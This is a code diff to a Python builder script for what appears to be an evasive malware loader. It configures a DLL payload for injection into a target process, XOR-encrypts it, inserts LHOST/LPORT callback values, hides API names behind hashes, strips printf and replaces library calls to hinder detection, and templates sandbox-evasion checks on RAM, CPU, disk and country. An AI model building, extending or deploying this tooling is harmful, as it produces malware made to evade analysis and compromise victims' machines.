@@ -18,6 +18,11 @@ def is_set(value):
 VERBOSE = True if sys.argv[1] == "true" else False
 PRIORIZE_SIZE = True if sys.argv[2] == "true" else False
 
+DLL_NAME = config.get("Payload", "dll_name")
+if not DLL_NAME:
+    print("DLL name must be specified in .conf")
+    sys.exit(1)
+
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
 if ENCRYPTION_METHOD == "xor":
     if config.get("Payload", "encryption_key") == "random":
@@ -31,9 +36,8 @@ else:
     sys.exit(1)
 
 TARGET_PROCESS = config.get("Payload", "target_process")
-# RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
-# RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
-# RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
+LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
+LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -51,7 +55,8 @@ if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
 
 WORKING_FOLDER = "build/"
 STUB_FILE = "loader.c"
-
+PAYLOAD_NAME = "injected-dll.dll"
+PAYLOAD_FILE = "payload.txt"
 
 def main():
 
@@ -61,7 +66,7 @@ def main():
         sed_files(WORKING_FOLDER, "strlen(", "custom_strlen(",[".c"])
         sed_files(WORKING_FOLDER, "strcmp(", "custom_strcmp(",[".c"])
         sed_files(WORKING_FOLDER, "strncpy(", "custom_strncpy(",[".c"])
-        sed_files(WORKING_FOLDER, "srand((", "// srand(")
+        sed_files(WORKING_FOLDER, "srand(", "// srand(")
         sed_files(WORKING_FOLDER, "rand()", f"{random.randint(0, 0xFFFF)}")
         sed_files(WORKING_FOLDER, "printf(", "// printf(")
 
@@ -78,33 +83,35 @@ def main():
         # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
         for tag in tags:
             parts = tag.replace("%", "").split("__")
+            if len(parts) == 1:
+                if parts[0] == "LHOST":
+                    sed_file(WORKING_FOLDER+filename, tag, LHOST)
+                elif parts[0] == "LPORT":
+                    sed_file(WORKING_FOLDER+filename, tag, str(LPORT))
             if parts[0] == "MODHASH": # definitions.c
                 sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],"", VERBOSE))
-            if parts[0] == "FCTHASH": # definitions.c
-                if parts[1] == "target_process":
-                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS, VERBOSE))
-                else:
-                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1], VERBOSE))
-            if parts[0] == "SANDBOX":
+            elif parts[0] == "FCTHASH": # definitions.c
+                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1], VERBOSE))
+            elif parts[0] == "SANDBOX":
                 if parts[1] == "RAM_CHECK":
                     if is_set(RAM_SIZE):
                         template = get_template("RAM_CHECK")
                         sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", RAM_SIZE))
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "")
-                if parts[1] == "CPU_CHECK":
+                elif parts[1] == "CPU_CHECK":
                     if is_set(CPU_COUNT):
                         template = get_template("CPU_CHECK")
                         sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "")
-                if parts[1] == "DISK_CHECK":
+                elif parts[1] == "DISK_CHECK":
                     if is_set(CPU_COUNT):
                         template = get_template("DISK_CHECK")
                         sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "")
-                if parts[1] == "COUNTRY_CHECK":
+                elif parts[1] == "COUNTRY_CHECK":
                     if len(AVOID_COUNTRIES):
                         template = get_template("COUNTRY_CHECK")
                         sed_file(WORKING_FOLDER+filename, tag, template)
@@ -143,10 +150,10 @@ def main():
                     else:
                         sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
 
-    PAYLOAD_NAME = "injected-dll.dll"
-    PAYLOAD_FILE = "payload.txt"
+    compile_dll(DLL_NAME)
+
     instructions = dll2instructions(WORKING_FOLDER+PAYLOAD_NAME)
-    with open("build/payload.txt", "w") as f:
+    with open(WORKING_FOLDER+PAYLOAD_FILE, "w") as f:
         f.write(str(instructions))
 
     print("================================\n") if VERBOSE else None
